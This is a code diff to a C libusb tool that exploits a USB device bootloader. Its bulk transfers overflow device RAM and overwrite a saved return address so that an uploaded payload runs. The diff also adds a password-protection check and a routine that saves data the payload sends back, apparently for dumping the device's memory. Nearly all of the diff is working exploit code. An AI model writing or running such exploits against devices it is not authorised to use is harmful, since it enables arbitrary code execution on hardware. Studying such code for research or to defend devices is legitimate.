@@ -22,8 +22,9 @@
 #define AM_REQ_WR_LARGE_MEM 0x11
 
 #define LOAD_ADDR 0xfffa0000
+#define RUN_ADDR  LOAD_ADDR
 #define TARGET_RA_PTR 0xfffe3688
-#define BULK_TRANSFER_SIZE 0x1000					  //alternative : 0x200 / 0x1000
+#define BULK_TRANSFER_SIZE 0x100					  //alternative : 0x200, 0x1000
 #define MAX_PAYLOAD_SIZE 0x10000 - BULK_TRANSFER_SIZE // we need the last transfer to overwrite return address
 #define BULK_TRANSFER_COUNT ((TARGET_RA_PTR - LOAD_ADDR) / BULK_TRANSFER_SIZE)
 #define RAM_SIZE ((TARGET_RA_PTR - (LOAD_ADDR + (BULK_TRANSFER_COUNT * BULK_TRANSFER_SIZE))) / 4) + 1
@@ -38,6 +39,29 @@ typedef struct __attribute__((__packed__)) dldata_s
 	u_int32_t unk1;
 	u_int8_t data[];
 } dldata_t;
+
+static int save_received_data(const char *filename){
+	FILE *fd;
+	int transferred = 0;
+	int total_transferred = 0;
+	uint8_t buf[0x200];//todo
+
+	fd = fopen(filename,"wb");
+	if (fd == NULL) {
+		fprintf(stderr, "Error: Can't open output file!\n");
+		return -1;
+	}
+
+	do {
+		libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_IN | 1, buf, sizeof(buf), &transferred, 10);// no error handling because device-side is a mess anyway
+		fwrite(buf, 1, transferred, fd);
+		total_transferred += transferred;
+	} while(transferred);
+
+	fclose(fd);
+
+	return total_transferred;
+}
 
 static int exploit(dldata_t *payload)
 {
@@ -96,7 +120,7 @@ static int exploit(dldata_t *payload)
 	}
 
 	//overwrite return address with payload address
-	ram[RAM_SIZE - 1] = LOAD_ADDR;
+	ram[RAM_SIZE - 1] = RUN_ADDR;
 
 	printf("- exploit: sending last transfer to overwrite RAM...\n");
 	rc = libusb_bulk_transfer(handle, LIBUSB_ENDPOINT_OUT | 2, (uint8_t *)ram, sizeof(ram), &transferred, 0);
@@ -117,13 +141,15 @@ int main(int argc, char *argv[])
 	libusb_context *ctx;
 	FILE *fd;
 	dldata_t *payload;
+	uint8_t identity[6];
 	size_t payload_size, fd_size;
 	int rc;
 
-	if (argc != 2)
+	if (!(argc == 2 || argc == 3))
 	{
-		printf("Usage: %s <input_file>\n", argv[0]);
+		printf("Usage: %s <input_file> [<output_file>]\n", argv[0]);
 		printf("\tinput_file: payload binary to load and execute (max size %u bytes)\n", MAX_PAYLOAD_SIZE);
+		printf("\toutput_file: file to write data returned by payload\n");
 		return EXIT_SUCCESS;
 	}
 
@@ -177,7 +203,29 @@ int main(int argc, char *argv[])
 		return EXIT_FAILURE;
 	}
 
-	exploit(payload);
+	rc = libusb_control_transfer(handle, 0xc0, 0x20, 0, 0, identity, sizeof(identity), 0);
+	if (rc != sizeof(identity))
+	{
+		fprintf(stderr, "Error: cannot execute identify command!\n");
+		return EXIT_FAILURE;
+	}
+
+	if(identity[4])
+	{
+		fprintf(stderr, "Error: device is protected by password.\n");
+		return EXIT_FAILURE;
+	}
+	else
+	{
+		exploit(payload);
+	}
+
+	if(argc == 3){
+		rc = save_received_data(argv[2]);
+		if(rc > 0){
+			printf("Received data saved to file %s (%u bytes).\n", argv[2], rc);
+		}
+	}
 
 	libusb_release_interface(handle, 0);
 
